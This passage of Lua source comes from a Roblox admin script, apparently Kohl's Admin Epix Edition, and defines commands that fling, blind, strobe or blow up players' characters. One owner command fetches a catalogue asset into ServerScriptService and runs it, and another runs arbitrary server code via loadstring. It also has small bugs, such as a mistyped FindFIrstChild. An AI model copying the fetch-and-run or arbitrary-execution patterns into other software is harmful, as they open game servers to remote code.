		if v2.Part0 == ags.t then table.insert(welds,v2) p1.Anchored = true v2.Part0 = nil end
		elseif v2:IsA('CharacterMesh') then
		local bp = tostring(v2.BodyPart):match('%w+.%w+.(%w+)')
		local msh = Instance.new('SpecialMesh')
		if bp and ags.c:findFirstChild(bp) then msh.Parent = ags.c:findFirstChild(bp) end
		msh.MeshId = 'http://www.roblox.com/asset/?id='..v2.MeshId
		if v2.BaseTextureId ~= 0 or v2.BaseTextureId ~= '0' then msh.TextureId = 'http://www.roblox.com/asset/?id='..v2.BaseTextureId end
		msh.Scale = msh.Scale*args[2] v2:Destroy()
		elseif v2:IsA('SpecialMesh') and v2.Parent ~= ags.c.Head then v2.Scale = v2.Scale*args[2]
		end size(v2)
		end
		end
		size(ags.c)
		ags.t.formFactor = 3
		ags.t.Size = ags.t.Size*args[2]
		for i2,v2 in pairs(welds) do v2.Part0 = ags.t v2.Part1.Anchored = false end
		for i2,v2 in pairs(ags.c:children()) do if v2:IsA('BasePart') then v2.Anchored = false end end
		local weld = Instance.new('Weld',ags.r) weld.Part0 = ags.r weld.Part1 = ags.t
	end
end)

set.MakeCommand('Give the target player(s) a small head',-1,set.Prefix,{'smallhead','minihead'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v.Character.Head.Mesh.Scale = Vector3.new(.75,.75,.75) v.Character.Torso.Neck.C0 = CFrame.new(0,.8,0) * CFrame.Angles(math.rad(90),math.rad(180),0) end
end)()
end
end)

set.MakeCommand('Fling the target player(s)',2,set.Prefix,{'fling'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") and v.Character:findFirstChild("Humanoid") then 
local xran local zran
repeat xran = math.random(-9999,9999) until math.abs(xran) >= 5555
repeat zran = math.random(-9999,9999) until math.abs(zran) >= 5555
v.Character.Humanoid.Sit = true v.Character.Torso.Velocity = Vector3.new(0,0,0)
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(xran*4,9999*5,zran*4) game:service("Debris"):AddItem(frc,.1)
end
end)()
end
end)

set.MakeCommand('Make the target player(s)\'s character spazz out on the floor',-1,set.Prefix,{'seizure'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v.Character:FindFIrstChild('Torso') then 
v.Character.Torso.CFrame = v.Character.Torso.CFrame * CFrame.Angles(math.rad(90),0,0) 
set.Remote(v,'Function','Effect','seizure')
end
end)()
end
end)

set.MakeCommand('Removes the effects of the seizure command',-1,set.Prefix,{'unseizure'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1])) do
set.Remote(v,'Function','Effect','unseizure')
end
end)

set.MakeCommand('Remove the target player(s)\'s arms and legs',-1,set.Prefix,{'removelimbs','delimb'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") and (obj.Name:find("Leg") or obj.Name:find("Arm")) then obj:Destroy() end
end
end
end)()
end
end)

set.MakeCommand('Name the target player(s) <name> or say hide to hide their character name',2,set.Prefix,{'name','rename'},{'player','name/hide'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v.Character and v.Character:findFirstChild("Head") then 
for a, mod in pairs(v.Character:children()) do if mod:findFirstChild("NameTag") then v.Character.Head.Transparency = 0 mod:Destroy() end end
local char = v.Character
local head = char:FindFirstChild('Head')
local mod = Instance.new("Model", char) mod.Name = args[2] or ''
local cl = char.Head:Clone() cl.Parent = mod 
local hum = Instance.new("Humanoid", mod) hum.Name = "NameTag" hum.MaxHealth = 0 hum.Health = 0
coroutine.wrap(function()
if args[2]:lower()~='hide' then
	repeat hum.MaxHealth=hum.MaxHealth hum.Health=v.Character.Humanoid.Health wait() until not v or not v.Parent or not char or not head or not hum or not mod or not mod.Parent or mod==nil or hum==nil or not hum.Parent
else
	mod.Name=''
end
end)()
cl.CanCollide=false
local weld = Instance.new("Weld", cl) weld.Part0 = cl weld.Part1 = char.Head
char.Head.Transparency = 1
end
end)()
end
end)

set.MakeCommand('Put the target player(s)\'s back to normal',2,set.Prefix,{'unname','fixname'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Head") then 
for a, mod in pairs(v.Character:children()) do if mod:findFirstChild("NameTag") then v.Character.Head.Transparency = 0 mod:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Change the target player(s)\'s Right Leg package',-1,set.Prefix,{'rleg','rightleg','rightlegpackage'},{'player','id'},2,function(plr,args)
	local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
	if id~=31 then set.Remote(plr,'Function','OutputGui','Id is not a right leg!') return end
	local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='RightLeg' then m:Destroy() end end
		part.Parent=v.Character
	end
end)

set.MakeCommand('Change the target player(s)\'s Left Leg package',-1,set.Prefix,{'lleg','leftleg','leftlegpackage'},{'player','id'},2,function(plr,args)
	local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
	if id~=30 then set.Remote(plr,'Function','OutputGui','Id is not a left leg!') return end
	local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='LeftLeg' then m:Destroy() end end
		part.Parent=v.Character
	end
end)

set.MakeCommand('Change the target player(s)\'s Right Arm package',-1,set.Prefix,{'rarm','rightarm','rightarmpackage'},{'player','id'},2,function(plr,args)
	local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
	if id~=28 then set.Remote(plr,'Function','OutputGui','Id is not a right arm!') return end
	local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='RightArm' then m:Destroy() end end
		part.Parent=v.Character
	end
end)

set.MakeCommand('Change the target player(s)\'s Left Arm package',-1,set.Prefix,{'larm','leftarm','leftarmpackage'},{'player','id'},2,function(plr,args)
	local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
	if id~=29 then set.Remote(plr,'Function','OutputGui','Id is not a left arm!') return end
	local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='LeftArm' then m:Destroy() end end
		part.Parent=v.Character
	end
end)

set.MakeCommand('Change the target player(s)\'s Left Arm package',-1,set.Prefix,{'torso','torsopackage'},{'player','id'},2,function(plr,args)
	local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
	if id~=27 then set.Remote(plr,'Function','OutputGui','Id is not a torso!') return end
	local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='Torso' then m:Destroy() end end
		part.Parent=v.Character
	end
end)

set.MakeCommand('Changes the target player(s)\'s character appearence to <ID>',-1,set.Prefix,{'char','character','appearance'},{'player','ID'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
v.CharacterAppearance = "http://www.roblox.com/asset/CharacterFetch.ashx?userId=" .. args[2]
v:LoadCharacter()
end
end)()
end
end)

set.MakeCommand('Put the target player(s)\'s character appearence back to normal',-1,set.Prefix,{'unchar','uncharacter','fixappearance'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
v.CharacterAppearance = "http://www.roblox.com/asset/CharacterFetch.ashx?userId=" .. v.userId
v:LoadCharacter()
end
end)()
end
end)

set.MakeCommand('Turn the target player(s) into a suit zombie',-1,set.Prefix,{'infect','zombify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
set.Infect(v.Character)
end
end)()
end
end)

set.MakeCommand('Make the target player(s)\'s character flash random colors',-1,set.Prefix,{'rainbowify','rainbow'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local parent=v:FindFirstChild('PlayerGui') or v:FindFirstChild('Backpack')
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
set.Remote(v,'Function','Effect','rainbowify')
end
end)()
end
end)

set.MakeCommand('Make the target player(s)\'s character flash',-1,set.Prefix,{'flashify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local parent=v:FindFirstChild('PlayerGui') or v:FindFirstChild('Backpack')
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
set.Remote(v,'Function','Effect','flashify')
end
end)()
end
end)

set.MakeCommand('Make the target player(s) look like a noob',-1,set.Prefix,{'noobify','noob'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
set.Noobify(v.Character)
end
end)()
end
end)

set.MakeCommand('Turn the target player(s) into a ghost',-1,set.Prefix,{'ghostify','ghost'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
set.Remote(v,'Function','Noclip','norm')
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = .5 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("Institutional white")
if prt.Name:find("Leg") then prt.Transparency = 1 end
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = .5 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Institutional white")
end end
end
end)()
end
end)

set.MakeCommand('Make the target player(s) look like gold',-1,set.Prefix,{'goldify','gold'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = .4 prt.BrickColor = BrickColor.new("Bright yellow")
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = .4 prt.Head.BrickColor = BrickColor.new("Bright yellow")
end end
end
end)()
end
end)

set.MakeCommand('Make the target player(s)\'s character shiney',-1,set.Prefix,{'shiney','shineify','shine'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 1 prt.BrickColor = BrickColor.new("Institutional white")
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 1 prt.Head.BrickColor = BrickColor.new("Institutional white")
end end
end
end)()
end
end)

set.MakeCommand('Make the target player(s) look normal',-1,set.Prefix,{'normal','normalify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Head") then v.Character.Head.Mesh.Scale = Vector3.new(1.25,1.25,1.25) end 
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
local parent=v:FindFirstChild('PlayerGui') or v:FindFirstChild('Backpack')
for a, sc in pairs(parent:children()) do if sc.Name == set.GuiName.."ify" or sc.Name==set.GuiName..'Glitch' or sc.Name == set.GuiName.."KohlsPoison" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do
if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("White")
if prt.Name == "FAKETORSO" then prt:Destroy() end
if prt.Name == 'HumanoidRootPart' then prt.Transparency=1 end
elseif prt:findFirstChild("NameTag") then 
	prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("White")
elseif prt.Name=='Kohls Puke' or prt.Name=='Kohls Bleed' then
	prt:Destroy()
elseif prt.Name==v.Name..'kohlscrusify' then
	set.RunCommand('refresh',v.Name)
end 
end
end
end)()
end
end)

set.MakeCommand('Makes the target player(s)\'s screen rapidly change colors',-1,set.Prefix,{'trippy'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','trippy')
end
end)

set.MakeCommand('Removes any effects on the target player(s)',-1,set.Prefix,{'uneffect','uneffectgui','unblind','unstrobe','untrippy','undance','unflashify','unrainbowify','guifix','fixgui'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	set.Remote(v,'Function','Effect','off')
end
end)

set.MakeCommand('Reverses the effects of the iceskate/slip command',-1,set.Prefix,{'unslip','unslippery','uniceskate'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr,args[1]:lower())
for i,v in pairs(plrz) do
set.Remote(v,'Function','Effect','unslip')
end
end)

set.MakeCommand('Makes the target player(s)\'s screen flash rapidly',-1,set.Prefix,{'strobe'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr,args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','strobe')
end
end)

set.MakeCommand('Blinds the target player(s)',-1,set.Prefix,{'blind'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','blind')
end
end)

set.MakeCommand('Loop heals the target player(s)',2,set.Prefix,{'loopheal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','loopheal')
end
end)

set.MakeCommand('UnLoop Heal',2,set.Prefix,{'unloopheal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do 
	set.Remote(v,'Function','Effect','unloopheal')
end
end)

set.MakeCommand('Loop flings the target player(s)',-1,set.Prefix,{'loopfling'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
	set.Remote(v,'Function','Effect','loopfling')
end
end)

set.MakeCommand('UnLoop Fling',-1,set.Prefix,{'unloopfling'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do 
	set.Remote(v,'Function','Effect','unloopfling')
end
end)

-------------------------
-- True Owner Commands --
-------------------------
set.MakeCommand('Force the target player(s) to teleport to the desired place',5,set.Prefix,{'forceplace'},{'player','placeid'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
game:GetService('TeleportService'):Teleport(args[2],v)
end)()
end
end)

set.MakeCommand('Force the script to update, buggy',5,set.Prefix,{'!updatekohls!'},{},1,function(plr,args)
local m=Instance.new('Message',workspace)
m.Text="Updating Kohl's Admin [Epix Edition] [MANUAL MODE]"
local mo=game:GetService('InsertService'):LoadAsset(145629584)
local news=mo:children()[1]
_G["Kohls Admin [Epix Edit] Update"]=set
news.Parent=game:service('ServerScriptService')
mo:Destroy()
wait(1)
m.Text='Breaking old version and respawning players...'
wait(1)
m:Destroy()
set=nil
RemoteEvent:Destroy()
script.Parent=nil
script.Disabled=true
script:Destroy()
for i,v in pairs(game:service('Players'):GetPlayers()) do
	v:LoadCharacter()
end
error('Breaking Old Version')
end)

set.MakeCommand('Ban the target player(s) forever',5,set.Prefix,{'permban'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(plr,'Function','PromptPermBan',v)
end
end)

set.MakeCommand('View and change settings',5,set.Prefix,{'settings'},{},0,function(plr,args)
for i,v in pairs(UpdatableSettings) do
	if set[v]~=nil then set.Remote(plr,'SetSetting',v,set[v]) end
end
set.Remote(plr,'SetSetting','UpdatableSettings',UpdatableSettings)
wait(1)
set.Remote(plr,'Function','Settings')
end)

set.MakeCommand('Change command permissions',5,set.Prefix,{'perms','permissions','comperms'},{set.Prefix..'cmd','all/donor/temp/admin/owner/creator'},2,function(plr,args)
	local level=nil
	if args[2]:lower()=='all' or args[2]:lower()=='0' then
		level=0
	elseif args[2]:lower()=='donor' or args[2]:lower()=='1' then
		level=1
	elseif args[2]:lower()=='temp' or args[2]:lower()=='2' then
		level=2
	elseif args[2]:lower()=='admin' or args[2]:lower()=='3' then
		level=3
	elseif args[2]:lower()=='owner' or args[2]:lower()=='4' then
		level=4
	elseif args[2]:lower()=='creator' or args[2]:lower()=='5' then
		level=5
	elseif args[2]:lower()=='funtemp' or args[2]:lower()=='-1' then
		level=-1
	elseif args[2]:lower()=='funadmin' or args[2]:lower()=='-2' then
		level=-2
	elseif args[2]:lower()=='funowner' or args[2]:lower()=='-3' then
		level=-3
	end
	if level~=nil then
		for i=1,#set.Commands do
			if args[1]:lower()==set.Commands[i].Prefix..set.Commands[i].Cmds[1]:lower() then 	
				set.Commands[i].AdminLevel=level
			end
		end
	else
		set.OutputGui(plr,'Command Error:','Invalid Permission')
	end
end)

set.MakeCommand('Restore the map to the the way it was the last time it was backed up',3,set.Prefix,{'restoremap','maprestore','rmap'},{},0,function(plr,args)
	set.Hint('Restoring Map...',game:service('Players'):children())
	wait(0.5)
	for i,v in pairs(workspace:children()) do
		coroutine.wrap(function()
			if v~=script and v.Archivable==true and not v:IsA('Terrain') then
				pcall(function() v:Destroy() end)
			end
		end)()
	end
	for i,v in pairs(set.MapBackup:children()) do
		coroutine.wrap(function()
			v:Clone().Parent=workspace
		end)()
	end
	wait(1)
	set.ProcessCommand(plr,set.Prefix.."respawn"..set.SplitKey..set.SpecialPrefix.."all")
	wait(1)
	set.Hint('Map Restore Complete.',game:service('Players'):children())
end)

--------------------
-- Owner Commands --
--------------------

set.MakeCommand('Changes the backup for the restore map command to the map\'s current state',4,set.Prefix,{'backupmap','mapbackup','bmap'},{},0,function(plr,args)
	set.Hint('Updating Map Backup...',{plr})
	local tempmodel=Instance.new('Model')
	for i,v in pairs(workspace:children()) do
		if v and not v:IsA('Terrain') and v.Archivable==true and v~=script and v~=RemoteEvent then
			v:Clone().Parent=tempmodel
		end
	end
	set.MapBackup=tempmodel:Clone()
	tempmodel:Destroy()
	set.Hint('Backup Complete',{plr})
end)

set.MakeCommand('Lets you explore the game, kinda like a file browser',4,set.Prefix,{'explore','explorer'},{},0,function(plr,args)
set.Remote(plr,'Function','Explorer')
end)

set.MakeCommand('Makes a tornado on the target player(s)',4,set.Prefix,{'tornado','twister'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		local p=Instance.new('Part',workspace)
		local s=Instance.new('Smoke',p)
		s.RiseVelocity=25
		s.Size=50
		p.Transparency=1
		s.Color=Color3.new(0,0,0)
		--local a,b,c=s:clone(),s:clone(),s:clone()
		--a.Parent=p b.Parent=p c.Parent=p
		local pos=v.Character.Torso.CFrame+Vector3.new(0,-3,0)
		p.CFrame=pos
		p.Size=Vector3.new(0.2,0.2,0.2)
		p.Anchored=true
		p.CanCollide=false
		local childList={}
		local function checkObject(obj)
			if (obj ~= p) and (obj.className == "Part") then
				--if (obj.Anchored ~= false) then obj.Anchored=false end
					table.insert(childList, 1, obj)
				--end
			elseif (obj.className == "Model") or (obj.className == "Hat") or (obj.className == "Tool") or (obj == workspace) then
				local child = obj:GetChildren()
				for x = 1, #child do
					checkObject(child[x])
				end
				obj.ChildAdded:connect(checkObject)
			end
		end
		checkObject(workspace)
			local massConstant = 5
			local mass = 3200 * massConstant
			local n = 0
			coroutine.wrap(function()
			while p.Parent==workspace do
				if n < #childList then
					n = n + 1
					if n % 800 == 0 then
						wait()
					end
				else
					n = 1
					wait()
				end
			
				local child = childList[n]
				if (child ~= p) and (child.className == "Part") and (child.Anchored == false) then
					local relPos = p.Position - child.Position
					local motivator = child:FindFirstChild("BlackHole Influence")
					if relPos.magnitude * 240 * massConstant < mass then
						child:BreakJoints()
						if (relPos.magnitude * 320 * massConstant < mass) and (child.Size.z + p.Size.x >  relPos.magnitude * 2 - 4) then
							mass = mass + child:GetMass()
							child:Remove()
							table.remove(childList, n)
							n = n - 1
						else
							child.CanCollide = false
							if motivator == nil then
								motivator = Instance.new("BodyPosition")
								motivator.Parent = child
								motivator.Name = "BlackHole Influence"
							end
							motivator.position = p.Position
							motivator.maxForce = Vector3.new(1, 1, 1) * mass * child:GetMass() / (relPos.magnitude * massConstant)
						end
					elseif motivator ~= nil then
						motivator:Remove()
					end
				end
			end
			end)()
		coroutine.wrap(function() wait(30) p:Destroy() end)()
		local posi=p.Position
		repeat
			p.CFrame = p.CFrame + Vector3.new(math.random(-5,5), 0, math.random(-5,5))
		wait()
		until p.Parent~=workspace or not p
	end
end)

set.MakeCommand('Nuke the target player(s)',4,set.Prefix,{'nuke'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local p = Instance.new("Part",game.Workspace) table.insert(set.objects,p)
p.Anchored = true
p.CanCollide = false
p.formFactor = "Symmetric"
p.Shape = "Ball"
p.Size = Vector3.new(1,1,1)
p.BrickColor = BrickColor.new("New Yeller")
p.Transparency = .5
p.Reflectance = .2
p.TopSurface = 0
p.BottomSurface = 0
local ex = Instance.new("Explosion", workspace)
ex.Position = p.Position
ex.BlastRadius = 100000
ex.BlastPressure = math.huge
ex.Hit:connect(function(hit)
if hit:IsA('Part') and hit~=p then hit.Anchored=false end
hit:BreakJoints()
end)
p.Touched:connect(function(hit)
if hit and hit.Parent then
local ex = Instance.new("Explosion", game.Workspace)
ex.Position = hit.Position
ex.BlastRadius = 100000
ex.BlastPressure = math.huge
if hit:IsA('Part') then hit.Anchored=false end
hit:BreakJoints()
end
end)
local cf = v.Character.Torso.CFrame
p.CFrame = cf
for i = 1, 333 do
p.Size = p.Size + Vector3.new(3,3,3)
p.CFrame = cf
wait(1/44)
end
p:Destroy()
end
end))
end
end)

--------------------------
-- Super Admin Commands --
--------------------------

set.MakeCommand('View server log',5,set.Prefix,{'serverlog','serverlogs','serveroutput','logsfordebug','debuglogs'},{'messagetype/all'},1,function(plr,args)
	local temp={}
	for i,v in pairs(game.LogService:GetLogHistory()) do
		if (args[1] and args[1]:lower()=='script') and v.message:find('Epix Edit') then
			if v.messageType==Enum.MessageType.MessageOutput then
				table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
			elseif v.messageType==Enum.MessageType.MessageWarning then
				table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
			elseif v.messageType==Enum.MessageType.MessageInfo then
				table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
			elseif v.messageType==Enum.MessageType.MessageError then
				table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
			end
		else 
		if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='error') and v.messageType==Enum.MessageType.MessageError then
			table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
		end
		if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='info') and v.messageType==Enum.MessageType.MessageInfo then
			table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
		end
		if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='warning') and v.messageType==Enum.MessageType.MessageWarning then
			table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
		end
		if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='output') and v.messageType==Enum.MessageType.MessageOutput then
			table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
		end
		end
	end
	set.Remote(plr,'Function','ListGui','Server Log',temp,'serverlogstuff-'..(args[1] or 'all'),1300)
end)

set.MakeCommand('View the admin logs for the server',5,set.Prefix,{'logs','log','commandlogs'},{},0,function(plr,args)
local temp={}
for i,m in pairs(set.PlayerLogs.Admin) do
	table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Log,Desc=m.Log})
end
--set.Remote(plr,'SetSetting','logs',set.logs)
set.Remote(plr,'Function','ListGui','Admin Logs',temp,'adminlogslist')
end)

set.MakeCommand('Displays the current chat logs for the server',2,set.Prefix,{'chatlogs','chatlog'},{},0,function(plr,args)
local temp={}
for i,m in pairs(set.PlayerLogs.Chat) do
	if m.Nil then
		table.insert(temp,{Object='[NIL]['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
	else
		table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
	end
end
set.Remote(plr,'Function','ListGui','Chat Logs',temp,'chatlogslist')
end)

set.MakeCommand('View the exploit logs for the server OR a specific player',2,set.Prefix,{'exploitlogs','exploitlog','sploitlogs','detections'},{},0,function(plr,args)
local temp={}
for i,m in pairs(set.PlayerLogs.Exploit) do
	table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Info,Desc=m.Info})
end
--set.Remote(plr,'SetSetting','logs',set.logs)
set.Remote(plr,'Function','ListGui','Exploit Logs',temp,'exploitlogslist')
end)

set.MakeCommand('Lets you run code on the server',3,set.Prefix,{'s','scr','script'},{'code'},1,function(plr,args)
if set.canuseloadstring then
set.Output(args[1], plr)
set.LoadScript('Script',args[1],set.AssignName(),true,game:service('ServerScriptService'))
else 
set.Hint('LoadStringEnabled is set to false! If you are the place owner read the Important section at the top of the script to learn how to fix this!',{plr})
end
end)

set.MakeCommand('[NO LONGER WORKS DUE TO ROBLOX UPDATES, LEFT IN IN-CASE THEY CHANGE THEIR MIND] Lets you run code as a local script',3,set.Prefix,{'ls','lscr','localscript'},{'code'},1,function(plr,args)
--if not set.canuseloadstring then set.Hint('[Currently no longer works] Loadstrings are disabled, output will not be shown',{plr}) return end
set.LoadOnClient(plr,args[1],true,set.AssignName())
set.Output(args[1], plr)
end)

set.MakeCommand('[NO LONGER WORKS DUE TO ROBLOX UPDATES, LEFT IN IN-CASE THEY CHANGE THEIR MIND] Lets you run local scripts on the target player(s)',3,set.Prefix,{'cs','cscr','clientscript'},{'player','code'},2,function(plr,args)
